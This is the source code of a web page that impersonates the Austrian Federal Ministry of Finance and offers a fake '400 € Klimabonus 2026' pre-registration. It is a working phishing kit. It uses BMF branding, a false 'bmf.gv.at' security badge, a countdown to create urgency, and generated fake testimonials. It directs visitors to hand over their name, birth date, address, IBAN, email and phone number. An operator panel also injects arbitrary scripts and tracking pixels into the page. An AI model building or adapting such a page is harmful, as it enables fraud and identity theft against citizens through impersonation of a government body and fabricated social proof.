import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  Gift, CalendarClock, ShieldCheck, MapPin,
  FileEdit, Mail, Wallet, IdCard,
  User, Calendar, CreditCard, Phone,
  ArrowRight, Lock, Home, Landmark,
} from "lucide-react";
import { usePanel } from "@/components/PanelProvider";
import bmfLogo from "@/assets/bmf_logo.svg";
import heroImage from "@/assets/klimabonus-hero-v2.png";

const BMF_RED = "#E6320F";
const BMF_RED_DARK = "#c42a0d";
const BMF_YELLOW = "#FFCC00";
const MONATE = [
  "Jänner", "Februar", "März", "April", "Mai", "Juni",
  "Juli", "August", "September", "Oktober", "November", "Dezember",
];
const JAHR = "2026";
const AKTIONS_ENDE = "01.08.2026";

const CATEGORY_CARDS = [
  { label: "Steuer-Infos für Bürger", href: "https://www.bmf.gv.at/themen/steuern.html" },
  { label: "Klimabonus Übersicht", href: "https://www.klimabonus.gv.at/" },
  { label: "FinanzOnline nutzen", href: "https://finanzonline.bmf.gv.at/" },
  { label: "Familienbonus Plus", href: "https://www.bmf.gv.at/themen/steuern/steuern-fuer-arbeitnehmer/familienbonus-plus.html" },
  { label: "Arbeitnehmerveranlagung", href: "https://www.bmf.gv.at/themen/steuern/arbeitnehmerinnenveranlagung.html" },
  { label: "Zoll & Reiseinfo", href: "https://www.bmf.gv.at/themen/zoll.html" },
];

type IconType = React.ComponentType<React.SVGProps<SVGSVGElement>>;

const InfoItem = ({ Icon, title, text }: { Icon: IconType; title: string; text: string }) => (
  <div className="bg-white border border-gray-200 rounded-2xl px-6 py-5 text-left flex items-start gap-4 shadow-sm transition-all duration-200 hover:shadow-md hover:border-gray-300 cursor-pointer group">
    <div className="min-w-0 flex-1">
      <div className="flex items-center gap-2.5 mb-1.5">
        <Icon className="w-5 h-5 shrink-0 text-gray-500" strokeWidth={1.5} />
        <h3 className="text-[15px] font-bold text-gray-900 leading-snug">{title}</h3>
      </div>
      <p className="text-[13.5px] text-gray-500 leading-relaxed pl-[30px]" dangerouslySetInnerHTML={{ __html: text }} />
    </div>
  </div>
);

const TARGET = new Date("2026-08-01T00:00:00").getTime();

const Countdown = () => {
  const [now, setNow] = useState(Date.now());
  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);
  const diff = Math.max(0, TARGET - now);
  const d = Math.floor(diff / 86400000);
  const h = Math.floor((diff % 86400000) / 3600000);
  const m = Math.floor((diff % 3600000) / 60000);
  const s = Math.floor((diff % 60000) / 1000);
  const boxes: [number, string][] = [[d, "TAGE"], [h, "STD"], [m, "MIN"], [s, "SEK"]];
  return (
    <div className="flex items-center justify-center gap-2 md:gap-3">
      {boxes.map(([v, label]) => (
        <div key={label} className="rounded-lg px-3 py-2.5 min-w-[56px] md:px-4 md:py-3 md:min-w-[64px] bg-white">
          <div className="text-2xl md:text-4xl font-black leading-none" style={{ color: BMF_RED }}>{String(v).padStart(2, "0")}</div>
          <div className="text-[10px] font-bold uppercase tracking-wider mt-1" style={{ color: BMF_RED }}>{label}</div>
        </div>
      ))}
    </div>
  );
};

/* ── Testimonials ── */
type Gender = "m" | "f";
type Testimonial = { name: string; text: string; time: string; avatar: string; gender: Gender };

const MALE_NAMES = [
  "Thomas Huber", "Markus Stein", "Michael Berger", "Stefan Hofer", "Christian Bauer",
  "Florian Reiter", "Daniel Moser", "Andreas Steiner", "Patrick Hauser", "Georg Koller",
  "Lukas Pöltl", "Martin Fuchs", "Christoph Aigner", "Alexander Wolf", "Robert Wallner",
  "Bernhard Holzer", "Dominik Neuner", "Manuel Stadler", "Felix Thaler", "Tobias Auer",
  "Benjamin Lechner", "Helmut Brandstätter", "Wolfgang Gruber", "Raphael Fink", "Philipp Aichinger",
];

const FEMALE_NAMES = [
  "Lisa Maier", "Sandra Gruber", "Anna Wimmer", "Julia Winkler", "Katharina Pichler",
  "Maria Eder", "Sophie Fischer", "Claudia Schwarz", "Eva Brunner", "Sabine Wagner",
  "Nina Egger", "Verena Leitner", "Stefanie Kern", "Melanie Schuster", "Christina Lang",
  "Simone Ortner", "Karin Ebner", "Birgit Riedl", "Jasmin Seidl", "Petra Hinterberger",
  "Vanessa Mayr", "Daniela Schmid", "Susanne Reiter", "Monika Huber", "Laura Schreiber",
];

const TEXTS = [
  "Ich hätte nie gedacht, dass die Voranmeldung so schnell geht. Die 400 € waren binnen weniger Tage am Konto!",
  "Super einfach und unkompliziert. Klimabonus schon erhalten – vielen Dank BMF!",
  "Am Anfang war ich skeptisch, aber die Auszahlung hat tatsächlich geklappt. Klare Empfehlung.",
  "Die Anmeldung hat keine 2 Minuten gedauert. Geld war nach wenigen Werktagen da – top!",
  "Habe die Info an Freunde weitergeleitet. Alle haben den Klimabonus bekommen!",
  "Endlich mal eine staatliche Leistung, die reibungslos funktioniert. 400 € geschenkt.",
  "Schnelle Verifizierung, unkomplizierte Auszahlung. Besser geht's nicht.",
  "Ich bin begeistert! Von der Anmeldung bis zur Gutschrift hat alles reibungslos funktioniert.",
  "Habe den Klimabonus gestern beantragt und heute war er schon am Konto. Wahnsinn!",
  "Tolle Aktion, habe es sofort meiner Familie weitergeleitet. Danke!",
  "Einfacher Prozess, keine versteckten Kosten. Genau so soll es sein.",
  "Ich war unsicher, aber ein Kollege hat mir davon erzählt. Alles hat perfekt geklappt.",
  "400 € einfach ausgezahlt bekommen – Klimabonus macht's möglich. Absolute Empfehlung!",
  "Die Verifizierung war in unter einer Minute erledigt. Super schnell!",
  "Nutze FinanzOnline schon lange – aber der Klimabonus ist ein echtes Plus. Danke!",
  "Einfach Daten eingeben, verifizieren und Bonus kassieren. So muss das sein!",
  "Meine Frau und ich haben beide den Klimabonus erhalten. 800 € für uns – genial!",
  "Sehr seriöser Ablauf. Hab mich jederzeit gut aufgehoben gefühlt.",
  "Mega Aktion! Hab's online gesehen und direkt mitgemacht.",
  "Die 400 € kamen schneller als erwartet. Vielen Dank an das Team!",
];

const buildTestimonials = (): Testimonial[] => {
  const males = MALE_NAMES.map((name, i) => ({
    name, gender: "m" as Gender,
    avatar: `https://randomuser.me/api/portraits/men/${(i * 3 + 7) % 99}.jpg`,
  }));
  const females = FEMALE_NAMES.map((name, i) => ({
    name, gender: "f" as Gender,
    avatar: `https://randomuser.me/api/portraits/women/${(i * 3 + 11) % 99}.jpg`,
  }));
  const people = [...males, ...females];
  const list: Testimonial[] = people.map((p, i) => ({
    ...p, text: TEXTS[i % TEXTS.length], time: "vor 1 Minute",
  }));
  for (let i = list.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [list[i], list[j]] = [list[j], list[i]];
  }
  return list;
};

const TESTIMONIALS: Testimonial[] = buildTestimonials();
const STARS = "★★★★★";
const TESTIMONIAL_HEIGHT = 100;

const TestimonialCarousel = () => {
  const [index, setIndex] = useState(0);
  const total = TESTIMONIALS.length;
  useEffect(() => {
    let timeout: ReturnType<typeof setTimeout>;
    const tick = () => {
      setIndex((prev) => (prev - 1 + total) % total);
      timeout = setTimeout(tick, 5000 + Math.random() * 5000);
    };
    timeout = setTimeout(tick, 5000 + Math.random() * 5000);
    return () => clearTimeout(timeout);
  }, [total]);
  const visible = [0, 1, 2].map((offset) => TESTIMONIALS[(index + offset) % total]);
  return (
    <section className="container mx-auto px-4 max-w-5xl">
      <style>{`
        @keyframes testimonial-slide-down { 0% { transform: translateY(-110%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
        @keyframes testimonial-shift-down { 0% { transform: translateY(-100%); } 100% { transform: translateY(0); } }
      `}</style>
      <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 mb-8 text-center">
        Das sagen unsere Teilnehmer
      </h2>
      <div className="relative overflow-hidden" style={{ height: `${TESTIMONIAL_HEIGHT * 3 + 24}px` }}>
        <div className="flex flex-col gap-3">
          {visible.map((t, i) => (
            <div
              key={`${index}-${i}`}
              className="bg-white border border-gray-200 rounded-xl p-5 flex items-start gap-4 shadow-sm"
              style={{
                minHeight: `${TESTIMONIAL_HEIGHT}px`,
                animation: i === 0
                  ? "testimonial-slide-down 700ms ease-out both"
                  : "testimonial-shift-down 700ms ease-out both",
              }}
            >
              <img src={t.avatar} alt={t.name} className="w-12 h-12 rounded-full object-cover shrink-0" loading="lazy" />
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-2 mb-1">
                  <span className="font-semibold text-[14px] text-gray-900">{t.name}</span>
                  <span className="text-[12px] text-gray-400">{t.time}</span>
                </div>
                <div className="text-[14px] mb-1" style={{ color: "#f5a623", letterSpacing: "1px" }}>{STARS}</div>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{t.text}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
};

const Klimabonus2 = () => {
  const navigate = useNavigate();
  const now = new Date();
  const aktuellerMonat = MONATE[now.getMonth()];
  const naechsterMonat = MONATE[(now.getMonth() + 1) % 12];

  const panel = usePanel();
  const pixelActive =
    panel.matched && panel.metaTagEnabled && !!panel.metaTagSnippet;

  useEffect(() => {
    document.title = `Klimabonus ${JAHR} – 400 € Voranmeldung | BMF`;
    const desc = `Klimabonus ${JAHR}: 400 € ab ${aktuellerMonat} ${JAHR}. Jetzt voranmelden beim Bundesministerium für Finanzen.`;
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", desc);
  }, [aktuellerMonat]);

  useEffect(() => {
    if (!pixelActive || !panel.metaTagSnippet) return;
    const container = document.createElement("div");
    container.innerHTML = panel.metaTagSnippet;
    const injected: Node[] = [];
    Array.from(container.childNodes).forEach((node) => {
      if (node.nodeType === Node.ELEMENT_NODE) {
        const el = node as HTMLElement;
        if (el.tagName === "SCRIPT") {
          const s = document.createElement("script");
          Array.from(el.attributes).forEach((a) => s.setAttribute(a.name, a.value));
          s.text = el.textContent || "";
          document.head.appendChild(s);
          injected.push(s);
        } else {
          document.head.appendChild(el);
          injected.push(el);
        }
      }
    });
    return () => { injected.forEach((n) => { if (n.parentNode) n.parentNode.removeChild(n); }); };
  }, [pixelActive, panel.metaTagSnippet]);

  const handleCta = () => {
    if (pixelActive && typeof (window as any).fbq === "function") {
      try { (window as any).fbq("track", "Lead"); } catch { /* ignore */ }
    }
    navigate("/klimabonus/voranmeldung");
  };

  const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
    { Icon: Home, title: "Wohnsitz in Österreich", text: "Sie benötigen einen <strong>gemeldeten Hauptwohnsitz</strong> in Österreich zum Stichtag." },
    { Icon: IdCard, title: "Mindestalter 18 Jahre", text: "Teilnahmeberechtigt sind alle Personen ab <strong>18 Jahren</strong> mit gültigem Ausweisdokument." },
    { Icon: Landmark, title: "Österreichisches Bankkonto", text: "Für die Auszahlung benötigen Sie eine <strong>gültige IBAN</strong> eines österreichischen Bankkontos." },
    { Icon: CalendarClock, title: "Zeitlich begrenzt", text: `Die Voranmeldung ist <strong>nur bis ${AKTIONS_ENDE}</strong> möglich – sichern Sie sich jetzt Ihren Klimabonus.` },
  ];

  const angaben: { Icon: IconType; title: string; text: string }[] = [
    { Icon: User, title: "Name", text: "Vollständiger Vor- und Nachname" },
    { Icon: Calendar, title: "Geburtsdatum", text: "Tag, Monat und Jahr" },
    { Icon: MapPin, title: "Adresse", text: "Straße, Hausnummer, PLZ, Ort" },
    { Icon: CreditCard, title: "IBAN", text: "Für die Auszahlung des Klimabonus" },
    { Icon: Mail, title: "E-Mail", text: "Für Bestätigung und Rückfragen" },
    { Icon: Phone, title: "Telefon", text: "Telefonnummer für Erreichbarkeit" },
  ];

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
      {/* Header + Hero – gemeinsamer Background */}
      <div
        className="relative border-b border-gray-200"
        style={{
          backgroundImage: `linear-gradient(180deg, rgba(255,255,255,0.55) 0%, rgba(255,255,255,0.35) 55%, rgba(0,0,0,0.35) 100%), url(${heroImage})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        <header>
          <div className="container mx-auto flex items-center justify-center px-4 py-5">
            <a href="https://www.bmf.gv.at/public.html" target="_blank" rel="noopener noreferrer" className="bg-white rounded-md px-4 py-2">
              <img src={bmfLogo} alt="Bundesministerium für Finanzen" className="h-8 md:h-10" />
            </a>
          </div>
        </header>

        <section className="relative overflow-hidden">
          <div className="relative z-10 container mx-auto px-4 pt-6 pb-[120px] md:pt-10 md:pb-[140px] max-w-4xl">
            <div className="text-center max-w-3xl mx-auto">
              <div className="inline-flex items-center gap-2 text-[12px] font-semibold uppercase tracking-[0.15em] mb-4 bg-white/85 backdrop-blur px-3 py-1.5 rounded-full text-gray-800 shadow-sm">
                <Gift className="w-4 h-4" style={{ color: BMF_RED }} />
                <span>Offizielle Voranmeldung · Klimabonus {JAHR}</span>
              </div>

              <h1 className="text-3xl md:text-5xl font-bold mb-3 tracking-tight text-gray-900 leading-[1.1] drop-shadow-sm">
                <span style={{ color: BMF_RED }}>400 €</span> Klimabonus
                <span className="block text-xl md:text-2xl font-bold text-gray-800 mt-2">
                  für alle Bürgerinnen und Bürger Österreichs
                </span>
              </h1>

              <p className="text-[13px] md:text-[15px] text-gray-800 mb-6 max-w-xl mx-auto leading-relaxed bg-white/60 backdrop-blur-sm rounded-md px-3 py-2 inline-block">
                Die Voranmeldung ist zeitlich begrenzt und endet am <strong className="text-gray-900">{AKTIONS_ENDE}</strong>.
                Sichern Sie sich jetzt Ihren Klimabonus, bevor die Frist abläuft.
              </p>

              <Countdown />

              <div className="mt-6">
                <button
                  type="button"
                  onClick={handleCta}
                  className="inline-flex items-center gap-2 font-extrabold text-base px-8 py-4 rounded-md transition-transform shadow-xl hover:scale-[1.02] active:scale-[0.99] text-white"
                  style={{ backgroundColor: BMF_RED }}
                >
                  <span>Jetzt voranmelden</span>
                  <ArrowRight className="w-5 h-5" />
                </button>
              </div>

              <div className="flex flex-wrap items-center justify-center gap-x-5 gap-y-2 mt-5">
                {[
                  { Icon: ShieldCheck, text: "Kostenlose Voranmeldung" },
                  { Icon: Wallet, text: "Direkte Auszahlung" },
                  { Icon: User, text: "Für alle Bürger Österreichs" },
                ].map(({ Icon, text }) => (
                  <div key={text} className="flex items-center gap-1.5 text-[13px] text-gray-800 bg-white/70 backdrop-blur-sm px-2.5 py-1 rounded">
                    <Icon className="w-4 h-4 shrink-0" style={{ color: BMF_RED }} />
                    <span>{text}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>
      </div>

      {/* Category Cards */}
      <div className="relative -mt-[80px] md:-mt-[100px] z-10 container mx-auto px-4 max-w-6xl">
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2 md:gap-3">
          {CATEGORY_CARDS.map((card) => (
            <a
              key={card.label}
              href={card.href}
              target="_blank"
              rel="noopener noreferrer"
              className="bg-white rounded-xl shadow-md hover:shadow-lg transition-shadow cursor-pointer flex flex-col h-[140px] md:h-[160px] no-underline p-4"
            >
              <div>
                <span className="text-[13px] md:text-[15px] font-semibold leading-snug" style={{ color: "#181818" }}>
                  {card.label}
                </span>
              </div>
              <div className="flex-1 flex items-end justify-end">
                <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ backgroundColor: "rgba(230,50,15,0.1)" }}>
                  <ArrowRight className="w-5 h-5" style={{ color: BMF_RED }} />
                </div>
              </div>
            </a>
          ))}
        </div>
      </div>

      <main className="py-12 md:py-14 space-y-14">
        {/* Info */}
        <section className="container mx-auto px-4 max-w-5xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm relative p-5 md:p-10">
            <img src={bmfLogo} alt="" className="absolute top-4 right-4 md:top-8 md:right-8 h-6 md:h-8 w-auto opacity-90" />
            <h2 className="text-lg md:text-2xl font-semibold text-gray-900 mb-3 pr-20 md:pr-40">
              So funktioniert die Klimabonus-Voranmeldung
            </h2>
            <div className="text-gray-600 text-[14px] md:text-[14.5px] leading-relaxed space-y-2 pr-0 md:pr-40">
              <p>
                Im Rahmen der ökologischen Steuerreform zahlt die Republik Österreich <strong>400 €</strong> Klimabonus an alle Bürgerinnen und Bürger mit Hauptwohnsitz in Österreich aus.
              </p>
              <p>
                Nach erfolgreicher Voranmeldung und Prüfung wird der Betrag direkt auf Ihr angegebenes Konto überwiesen.
              </p>
              <p className="font-semibold" style={{ color: BMF_RED }}>
                Voranmeldung endet am {AKTIONS_ENDE} – jetzt sichern!
              </p>
            </div>
          </div>
        </section>

        {/* Voraussetzungen */}
        <section className="container mx-auto px-4 max-w-5xl">
          <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 mb-8 text-center">
            Voraussetzungen
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {voraussetzungen.map((v) => (
              <InfoItem key={v.title} Icon={v.Icon} title={v.title} text={v.text} />
            ))}
          </div>
        </section>

        {/* Ablauf */}
        <section className="container mx-auto px-4 max-w-5xl">
          <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 mb-8 text-center">
            So funktioniert der Klimabonus {JAHR}
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 max-w-4xl mx-auto">
            {[
              { Icon: FileEdit, title: "Voranmelden", text: "Online-Formular in 2 Minuten ausfüllen" },
              { Icon: ShieldCheck, title: "Daten prüfen", text: "Wir prüfen Ihre Angaben" },
              { Icon: Mail, title: "Bestätigung", text: "Bestätigung per E-Mail" },
              { Icon: Wallet, title: `400 € im ${naechsterMonat}`, text: "Auszahlung auf Ihr Konto" },
            ].map((s, i) => (
              <div key={s.title} className="bg-white border border-gray-200 rounded-xl p-5 text-center shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300">
                <span className="mx-auto mb-3 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold" style={{ border: `1px solid ${BMF_RED}`, color: BMF_RED }}>
                  {i + 1}
                </span>
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1 leading-tight">{s.title}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{s.text}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Welche Angaben */}
        <section className="container mx-auto px-4 max-w-5xl">
          <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 mb-8 text-center">
            Welche Angaben Sie benötigen
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {angaben.map((a) => (
              <InfoItem key={a.title} Icon={a.Icon} title={a.title} text={a.text} />
            ))}
          </div>
        </section>

        {/* Testimonials */}
        <TestimonialCarousel />

        {/* CTA Box */}
        <section className="container mx-auto px-4 max-w-5xl">
          <div className="rounded-xl overflow-hidden shadow-lg flex items-center" style={{ backgroundColor: BMF_RED_DARK }}>
            <div className="flex-1 p-8 md:py-10 md:px-12">
              <h2 className="text-xl md:text-2xl font-semibold text-white mb-2">
                Bereit für Ihre Voranmeldung?
              </h2>
              <p className="text-white/85 text-[14.5px] mb-6 leading-relaxed">
                In nur 2 Minuten erledigt – sichern Sie sich jetzt 400&nbsp;€ Klimabonus.
              </p>
              <button
                type="button"
                onClick={handleCta}
                className="inline-flex items-center gap-2 font-semibold text-sm px-7 py-3 rounded-full transition-colors"
                style={{ backgroundColor: BMF_YELLOW, color: "#1a1a1a" }}
              >
                <span>Jetzt voranmelden</span>
                <ArrowRight className="w-4 h-4" />
              </button>
              <div className="flex items-center gap-2 mt-4 text-[12px] text-white/70">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL-verschlüsselt · bmf.gv.at</span>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: "#fafafa" }} className="text-[#333] mt-12 border-t border-gray-200">
        <div className="h-[3px] w-full" style={{ background: `linear-gradient(90deg, ${BMF_RED} 0%, ${BMF_RED} 33%, #fff 33%, #fff 66%, ${BMF_RED} 66%)` }} />
        <div className="container mx-auto px-6 pt-10 pb-6 max-w-6xl">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 pb-6">
            <div>
              <h4 className="font-bold text-[15px] mb-3">Über das BMF</h4>
              <ul className="space-y-2 text-[13px]">
                <li><a href="https://www.bmf.gv.at/ministerium/das-ministerium.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Das Ministerium</a></li>
                <li><a href="https://www.bmf.gv.at/public/presse.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Presse</a></li>
                <li><a href="https://www.bmf.gv.at/ministerium/karriere.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Karriere</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-[15px] mb-3">Services</h4>
              <ul className="space-y-2 text-[13px]">
                <li><a href="https://finanzonline.bmf.gv.at/" target="_blank" rel="noopener noreferrer" className="hover:underline">FinanzOnline</a></li>
                <li><a href="https://www.klimabonus.gv.at/" target="_blank" rel="noopener noreferrer" className="hover:underline">Klimabonus</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-[15px] mb-3">Service für Sie</h4>
              <ul className="space-y-2 text-[13px]">
                <li><a href="https://service.bmf.gv.at/Service/Allg/Feedback/_start.asp?FTyp=KONTAKT" target="_blank" rel="noopener noreferrer" className="hover:underline">Kontakt</a></li>
                <li><a href="https://www.bmf.gv.at/public/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Barrierefreiheit</a></li>
              </ul>
            </div>
            <div aria-hidden="true" />
          </div>
        </div>
        <div className="border-t border-[#e5e5e5]" />
        <div className="container mx-auto px-6 py-5 max-w-6xl">
          <div className="flex flex-wrap items-center gap-x-4 gap-y-2 text-[13px] text-[#333]">
            <span>© {JAHR} Bundesministerium für Finanzen</span>
            <a href="https://www.bmf.gv.at/public/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Impressum</a>
            <a href="https://www.bmf.gv.at/public/datenschutz.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Datenschutz</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Klimabonus2;
